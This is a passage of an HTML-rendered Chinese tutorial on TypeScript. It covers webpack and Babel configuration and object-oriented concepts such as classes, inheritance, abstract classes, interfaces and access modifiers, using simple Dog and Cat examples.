title="tsconfig.json"></a>tsconfig.json</h3><ul><li>根目录下创建tsconfig.json，配置可以根据自己需要<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ES2015&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ES2015&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><ul><li>修改package.json添加如下配置<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack serve --open chrome.exe&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="执行、构建"><a href="#执行、构建" class="headerlink" title="执行、构建"></a>执行、构建</h3><ul><li>在src下创建ts文件，并在并命令行执行<code>npm run build</code>对代码进行编译，或者执行<code>npm start</code>来启动开发服务器</li></ul><hr><h2 id="Babel"><a href="#Babel" class="headerlink" title="Babel"></a>Babel</h2><ul><li>作用<ul><li>结合babel来对代码进行转换以使其可以兼容到更多的浏览器<ul><li>新语法转换成旧语法</li><li>新的技术（类和对象）在旧浏览器不支持的通过一些方式让其支持</li></ul></li></ul></li></ul><h3 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm i <span class="literal">-D</span> @babel/core @babel/p<span class="built_in">reset-env</span> babel<span class="literal">-loader</span> core<span class="literal">-js</span></span><br></pre></td></tr></table></figure><ul><li>共安装了4个包，分别是：<ul><li>@babel/core<ul><li>babel的核心工具</li></ul></li><li>@babel/preset-env<ul><li>babel的预定义环境，兼容不同的浏览器</li></ul></li><li>babel-loader<ul><li>babel在webpack中的加载器（将babel和webpack结合的工具）</li></ul></li><li>core-js<ul><li>模拟js的运行环境，core-js用来使老版本的浏览器支持新版ES语法</li></ul></li></ul></li></ul><h3 id="修改webpack-config-js配置文件"><a href="#修改webpack-config-js配置文件" class="headerlink" title="修改webpack.config.js配置文件"></a>修改webpack.config.js配置文件</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入一个包，nodejs中的一个模块，作用是拼接路径</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="comment">// 引入html插件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HTMLWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>);</span><br><span class="line"><span class="comment">// 引入clean插件</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">CleanWebpackPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;clean-webpack-plugin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// webpack中的所有的配置信息都应该写在module.exports中</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">optimization</span>:&#123;</span><br><span class="line">    <span class="attr">minimize</span>: <span class="literal">false</span> <span class="comment">// 关闭代码压缩，可选</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 指定入口文件</span></span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/index.ts&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 指定打包文件所在目录</span></span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="comment">// 指定打包文件的目录</span></span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>), <span class="comment">// &quot;./dist&quot;</span></span><br><span class="line">    <span class="comment">// 打包后文件的文件</span></span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 告诉webpack不使用箭头</span></span><br><span class="line">    <span class="attr">environment</span>:&#123;</span><br><span class="line">      <span class="attr">arrowFunction</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 指定webpack打包时要使用模块</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="comment">// 指定要加载的规则</span></span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// test指定的是规则生效的文件</span></span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>,</span><br><span class="line">        <span class="comment">// 要使用的loader</span></span><br><span class="line">        <span class="comment">// user: &#x27;ts-loader&#x27;</span></span><br><span class="line">        <span class="comment">// 加载器的顺序是从后往前执行的</span></span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="comment">// 配置babel</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">// 指定加载器</span></span><br><span class="line">            <span class="attr">loader</span>:<span class="string">&quot;babel-loader&quot;</span>,</span><br><span class="line">            <span class="comment">// 设置babel</span></span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="comment">// 设置预定义的环境</span></span><br><span class="line">              <span class="attr">presets</span>:[</span><br><span class="line">                [</span><br><span class="line">                  <span class="comment">// 指定环境的插件</span></span><br><span class="line">                  <span class="string">&quot;@babel/preset-env&quot;</span>,</span><br><span class="line">                  <span class="comment">// 配置信息</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="comment">// 要兼容的目标浏览器</span></span><br><span class="line">                    <span class="attr">targets</span>:&#123;</span><br><span class="line">                      <span class="string">&quot;chrome&quot;</span>:<span class="string">&quot;58&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;ie&quot;</span>:<span class="string">&quot;11&quot;</span> <span class="comment">// 编译后文件中const变为var，如果这里不设置ie，const不变</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="comment">// 指定corejs的版本</span></span><br><span class="line">                    <span class="string">&quot;corejs&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="comment">// ie11中没有Promise，需要使用corejs</span></span><br><span class="line">                    <span class="comment">// 使用corejs的方式 &quot;usage&quot; 表示按需加载</span></span><br><span class="line">                    <span class="string">&quot;useBuiltIns&quot;</span>:<span class="string">&quot;usage&quot;</span></span><br><span class="line">                  &#125;</span><br><span class="line">                ]</span><br><span class="line">              ]</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, <span class="comment">// 后执行</span></span><br><span class="line">          <span class="string">&#x27;ts-loader&#x27;</span> <span class="comment">// 先执行</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 要排除的文件</span></span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node-modules/</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 配置Webpack插件</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">CleanWebpackPlugin</span>(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HTMLWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="comment">// title: &quot;这是一个自定义的title&quot;</span></span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;./src/index.html&quot;</span> <span class="comment">//模板</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用来设置引用模块（import引入文件）</span></span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&#x27;.ts&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul><li>面向对象，简而言之就是程序之中所有的操作都需要通过对象来完成</li><li>举例来说：<ul><li>操作浏览器要使用window对象</li><li>操作网页要使用document对象</li><li>操作控制台要使用console对象</li></ul></li></ul><hr><h2 id="类（class）"><a href="#类（class）" class="headerlink" title="类（class）"></a>类（class）</h2><ul><li>类可以理解为对象的模型，程序中可以根据类创建指定类型的对象 </li></ul><h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><ul><li>使用class关键字定义一个类</li><li>类(对象)中包含两个部分<ul><li>属性<ul><li>直接定义的属性是实例属性，需要通过对象的实例去访问<ul><li>const per = new Person()</li><li>per.name</li></ul></li><li>使用static开头的属性是静态属性（类属性），可以直接通过类去访问<ul><li>Person.age</li></ul></li><li>readonly开头的属性表示一个只读的属性无法修改 <ul><li>readonly name:string = ‘xxxx’</li><li>static readonly age = 18</li></ul></li></ul></li><li>方法<ul><li>如果方法已static开头则方法就是类方法，可以直接通过类去调用</li><li>如果直接定义方法，则方法是实例方法，需要通过对象的实例去调用<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">  <span class="comment">//定义实例属性</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span> = <span class="string">&#x27;孙悟空&#x27;</span>;</span><br><span class="line">  <span class="comment">// 在属性前使用static关键字可以定义类属性（静态属性）</span></span><br><span class="line">  <span class="keyword">static</span> <span class="attr">age</span>: <span class="built_in">number</span> = <span class="number">18</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 定义方法</span></span><br><span class="line">  <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hello，大家好&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">sayBye</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;goodbye，再见&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> per = <span class="keyword">new</span> <span class="title class_">Person</span>() <span class="comment">// per是person的实例对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">age</span>)</span><br><span class="line">per.<span class="title function_">sayHello</span>()</span><br><span class="line"><span class="title class_">Person</span>.<span class="title function_">sayBye</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h2 id="面向对象的特点"><a href="#面向对象的特点" class="headerlink" title="面向对象的特点"></a>面向对象的特点</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><ul><li>constructor 被称为构造函数</li><li>构造函数在对象创建时调用，即调用new Dog()时</li><li>this指向<ul><li>在实例方法中，this表示当前的实例</li><li>在构造函数中当前对象就是当前新建的那个对象</li><li>在方法中可以通过this来表示当前调用方法的对象<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    <span class="comment">// name = &#x27;旺财&#x27;;</span></span><br><span class="line">    <span class="comment">// age = 3;</span></span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// constructor 被称为构造函数</span></span><br><span class="line">    <span class="comment">// 构造函数在对象创建时调用，即调用new Dog()时</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">        <span class="comment">// 在实例方法中，this表示当前的实例</span></span><br><span class="line">        <span class="comment">// 在构造函数中当前对象就是当前新建的那个对象</span></span><br><span class="line">        <span class="comment">// 可以通过this向新建的对象中添加属性</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">bark</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 在方法中可以通过this来表示当前调用方法的对象</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;小黑&#x27;</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">const</span> dog1 = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;小白&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">dog.<span class="title function_">bark</span>()</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ul><li>通过继承可以将其他类中的属性和方法引入到当前类中</li><li>Dog extends Animal<ul><li>此时Animal被成为父类，Dog被称为子类</li><li>使用继承后，子类将会拥有父类所有的方法和属性</li><li>通过继承可以将多个类中共有的代码写在一个父类中，<ul><li>这样只需要写一次即可让所有的子类都同时拥有父类中的属性和方法</li><li>如果希望在子类中添加一些父类中没有的属性或方法直接加</li></ul></li><li>如果在子类中添加了和父类相同的方法，则子类方法会覆盖掉父类的方法<ul><li>这种子类覆盖掉父类方法的形式，称为方法重写</li></ul></li></ul></li><li>继承的好处，在不修改原来类的情况上对新继承的类进行扩展，例如表示狗的类</li><li>以下是比较繁琐的猫狗类<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 定义一个表示狗的类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">        <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">age</span> = age </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;汪汪汪&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 定义一个表示猫的类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Cat</span>&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">        <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;喵喵喵&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;旺财&#x27;</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&#x27;咪咪&#x27;</span>, <span class="number">3</span>)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li><li>以下是使用继承后创建的猫狗类<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 类的继承</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 定义一个表示动物的类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">        <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">age</span> = age </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;动物在叫~&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 定义一个表示狗的类</span></span><br><span class="line">    <span class="comment">// 使Dog类继承Animal类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">        <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>在跑~~`</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;汪汪汪~&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 定义一个表示猫的类</span></span><br><span class="line">    <span class="comment">// 使Cat类继承Animal类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;旺财&#x27;</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&#x27;咪咪&#x27;</span>, <span class="number">3</span>)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ul><h3 id="super"><a href="#super" class="headerlink" title="super"></a>super</h3><ul><li>在类的方法中super表示当前类的父类</li><li>如果在子类中写了构造函数，在子类构造函数中必须对父类中的构造函数进行调用<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;动物在叫~&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果在子类中写了构造函数，在子类构造函数中必须对父类中的构造函数进行调用</span></span><br><span class="line">            <span class="variable language_">super</span>(name); <span class="comment">// 调用父类的构造函数，父类的构造函数中有name属性，这里同样需要</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="comment">// 在类的方法中super表示当前类的父类</span></span><br><span class="line">            <span class="variable language_">super</span>.<span class="title function_">sayHello</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;旺财&#x27;</span>, <span class="number">3</span>)</span><br><span class="line">    dog.<span class="title function_">sayHello</span>()</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ul><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><ul><li>抽象类，以abstract开头的类<ul><li>抽象类和其他类区别不大，只是不能用来创建对象</li><li>抽象类就是专门用来被继承的类</li><li>抽象类中可以添加抽象方法<ul><li>抽象方法使用abstract开头，没有方法体</li><li>抽象方法只能定义在抽象类中，子类必须对抽象方法进行重写<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">abstract</span> <span class="title function_">sayHello</span>():<span class="built_in">void</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;汪汪汪~&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">        <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;喵喵喵~&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;旺财&#x27;</span>)</span><br><span class="line">    dog.<span class="title function_">sayHello</span>()</span><br><span class="line">    <span class="comment">// const an = new Animal() // 报错，因为Animal是抽象类</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h2 id="接口（interface）"><a href="#接口（interface）" class="headerlink" title="接口（interface）"></a>接口（interface）</h2><ul><li>接口，类似于抽象类，不同在于接口中的所有方法和属性都是没有实值的，换句话说接口中的所有方法都是抽象方法</li><li>接口作用：<ul><li>用来定义一个类结构，且定义一个类中应该包含哪些属性和方法</li><li>同时接口也可以当作类型声明使用</li></ul></li><li>接口可以在定义类的时候去限制类的结构<ul><li>接口中的所有的属性都不能有实际的值</li><li>接口只定义对象的结构，而不考虑实际值</li><li>在接口中所有的方法都是抽象方法<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 声明类型</span></span><br><span class="line">  <span class="comment">// 描述一个对象的类型</span></span><br><span class="line">  <span class="keyword">type</span> myType = &#123; <span class="comment">// myType声明唯一</span></span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="built_in">number</span>,</span><br><span class="line">    <span class="comment">// [propName: string]: any</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 接口</span></span><br><span class="line">  <span class="keyword">interface</span> myInterface&#123; <span class="comment">// myInterface可以重复声明，使用时将同名的接口中的属性合并</span></span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">    <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">interface</span> myInterface&#123;</span><br><span class="line">    <span class="attr">gander</span>: <span class="built_in">string</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> <span class="attr">obj</span>: myType = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;sss&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">obj1</span>: myInterface = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;sss&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">gender</span>: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/******************************************/</span></span><br><span class="line">  <span class="comment">// 定义类</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 定义类时，可以使类去实现一个接口</span></span><br><span class="line">  <span class="comment">// 实现接口就是使类满足接口的要求</span></span><br><span class="line">  <span class="comment">// 实现接口时类中要保护接口中的所有属性</span></span><br><span class="line">  <span class="keyword">interface</span> myInter&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="built_in">string</span>,</span><br><span class="line">      <span class="title function_">sayHello</span>():<span class="built_in">void</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">MyClass</span> <span class="keyword">implements</span> myInter&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">      <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">sayHello</span>(<span class="params"></span>)&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;大家好~&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="属性的封装"><a href="#属性的封装" class="headerlink" title="属性的封装"></a>属性的封装</h2><ul><li>TS可以在属性前添加属性的修饰符<ul><li>public（默认值） 修饰的属性可以在任意的位置访问（修改），可以在类、子类和对象中修改</li><li>private 私有属性，私有属性只能在类内进行访问（修改），可以在类中修改<ul><li>通过在类中添加方法使得私有属性可以被外部访问</li><li>TS中设置getter和setter方法的方式，可以直接使用实例对象调用<ul><li>console.log(per.name)调用get name()方法</li><li>per.name = ‘猪八戒’调用的是set name(value)方法</li></ul></li></ul></li><li>protected 受保护的属性，只能在当前类和当前类的子类中访问（修改），可以在类、子类中修改<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 定义一个表示人的类</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="attr">_name</span>: <span class="built_in">string</span>;</span><br><span class="line">      <span class="keyword">private</span> <span class="attr">_age</span>: <span class="built_in">number</span>;</span><br><span class="line">      <span class="title function_">constructor</span>(<span class="params">name, age</span>)&#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">_name</span> = name;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">_age</span> = age;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      *   